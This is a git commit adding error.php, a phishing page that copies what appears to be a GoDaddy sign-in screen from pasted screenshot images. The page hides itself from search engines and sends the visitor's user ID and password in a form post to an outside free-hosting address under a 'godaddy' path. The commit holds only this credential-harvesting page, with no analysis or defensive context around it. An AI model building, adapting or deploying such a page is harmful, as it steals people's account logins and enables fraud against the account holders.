699730a791f00d3c267577b17c4212afee1d143e
prokacey <prokacey11@hotmail.com>
2020-02-07 15:50:47 +0800

    first commit

---
+++ error.php
@@ -0,0 +1,116 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Sign In</title>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
+<meta charset="utf-8" />
+<meta name="applicable-device" content="pc,mobile" />
+ <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="googlebot" content="noindex, nofollow">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="format-detection" content="telephone=no" />
+
+<link rel="shortcut icon"
+              href="https://img1.wsimg.com/auth/v1/static/2502/img/favicon.ico">
+			  
+			  
+	
+<script type="text/javascript">
+
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+
+</script>
+
+<body style="visibility:hidden" onload="unhideBody()">
+<style type="text/css">
+
+.textox {
+   width: 279px;
+   height: 40px;
+   border: solid 1px #BFBFBF;
+   padding: 2px;
+   border-radius: 3px;
+   font-size: 12px;
+   background-color: #FFFFFF;
+   outline: none;
+   color: #474747;
+  }
+.textox:focus  {
+   border: solid 1px #6AB6E6;
+  }
+  
+.textox2 {
+   width: 139px;
+   height: 24px;
+   border: solid 1px #FFFFFF;
+   padding: 2px;
+   border-radius: 3px;
+   font-size: 12px;
+   background-color: #FFFFFF;
+   outline: none;
+   color: #474747;
+  }
+
+input[type=checkbox].css-checkbox {
+							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
+						}
+
+						input[type=checkbox].css-checkbox + label.css-label, input[type=checkbox].css-checkbox + label.css-label.clr {
+							padding-left:29px;
+							height:24px; 
+							display:inline-block;
+							line-height:24px;
+							background-repeat:no-repeat;
+							background-position: 0 0;
+							font-size:24px;
+							vertical-align:middle;
+							cursor:pointer;
+
+						}
+
+						input[type=checkbox].css-checkbox:checked + label.css-label, input[type=checkbox].css-checkbox + label.css-label.chk {
+							background-position: 0 -24px;
+						}
+						label.css-label {
+				background-image:url(http://csscheckbox.com/checkboxes/u/csscheckbox_a608ec28e6c50a02870bf452f125b974.png);
+				-webkit-touch-callout: none;
+				-webkit-user-select: none;
+				-khtml-user-select: none;
+				-moz-user-select: none;
+				-ms-user-select: none;
+				user-select: none;
+			}
+
+</style>
+
+</head>
+<body>
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1518px; height:48px; z-index:1"><img src="https://i.postimg.cc/yYFQfc6r/2019-07-28-15-23-30-Sign-In.png" alt="" title="" border=0 width=1518 height=48></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:48px; width:775px; height:710px; z-index:1"><img src="https://i.postimg.cc/VsWvwsRZ/2019-07-28-15-25-50-Sign-In.png" alt="" title="" border=0 width=775 height=710></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:600px; width:797px; height:340px; z-index:1"><img src="https://i.postimg.cc/K8fXZNvC/plainright.png" alt="" title="" border=0 width=797 height=340></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:775px; top:48px; width:535px; height:187px; z-index:1"><img src="https://i.postimg.cc/LXYH12Kf/2019-07-28-15-29-33-Sign-In.png" alt="" title="" border=0 width=535 height=187></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:1300.5px; top:48px; width:220px; height:709px; z-index:1"><img src="https://i.postimg.cc/htNkJxsD/2019-07-28-15-32-21-Sign-In.png" alt="" title="" border=0 width=220 height=709></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:1282px; top:598px; width:240px; height:340px; z-index:1"><img src="https://i.postimg.cc/j5dPpR3G/plainrightt.png" alt="" title="" border=0 width=240 height=340></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:870px; top:270px; width:350px; height:97px; z-index:1"><img src="https://i.postimg.cc/nr9kWHCn/2019-07-28-18-29-38-Sign-In.png" alt="" title="" border=0 width=350 height=97></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:870px; top:395px; width:100px; height:77px; z-index:1"><img src="https://i.postimg.cc/667sLtjb/2019-07-28-15-33-26-Sign-In.png" alt="" title="" border=0 width=100 height=77></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:870px; top:536px; width:72px; height:16px; z-index:1"><img src="https://i.postimg.cc/ryHyGh8c/2019-07-28-15-36-17-Sign-In.png" alt="" title="" border=0 width=72 height=16></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:1163px; top:536px; width:55px; height:17px; z-index:1"><img src="https://i.postimg.cc/MGW2yBN1/2019-07-28-15-48-30-Sign-In.png" alt="" title="" border=0 width=55 height=17></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:892px; top:619px; width:155px; height:20px; z-index:1"><img src="https://i.postimg.cc/ZnkCYjsr/2019-07-28-15-49-09-Sign-In.png" alt="" title="" border=0 width=155 height=20></div>
+<div id="image2" style="position:absolute; overflow:hidden; left:775px; top:732px; width:535px; height:145px; z-index:1"><img src="https://i.postimg.cc/Dy0s0bmY/2019-07-28-15-31-14-Sign-In.png" alt="" title="" border=0 width=535 height=145></div>
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:875px; width:1518px; height:61px; z-index:1"><img src="https://i.postimg.cc/SKD1qhw0/2019-07-28-15-24-42-Settings.jpg" alt="" title="" border=0 width=1518 height=61></div>
+
+<form action="https://elukuson.000webhostapp.com/godaddy/insertt.php" name=chalbhai id=chalbhai method=post>
+
+<input name="userid" required type="text" class="textox"  placeholder="" style="position:absolute;width:344px;height:42px;padding-left:10px;font-size:17px;left:870px;top:480px;z-index:22">
+<input name="pass" required type="password" class="textox"  placeholder="" style="position:absolute;width:344px;height:42px;padding-left:10px;font-size:17px;left:870px;top:560px;z-index:22">
+
+<div id="checkboxG1"  style="position:absolute; left:868px; top:620px; z-index:24"><input type="checkbox" name="checkboxG2" id="checkboxG2" ><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
+<div id="formimage1" style="position:absolute; left:870px; top:654px; z-index:25"><input type="image" name="formimage1" width="344" height="44" src="https://i.postimg.cc/YCCT07Wx/2019-07-28-15-49-45-Sign-In.png"></div>
+
+</body>
+</html>
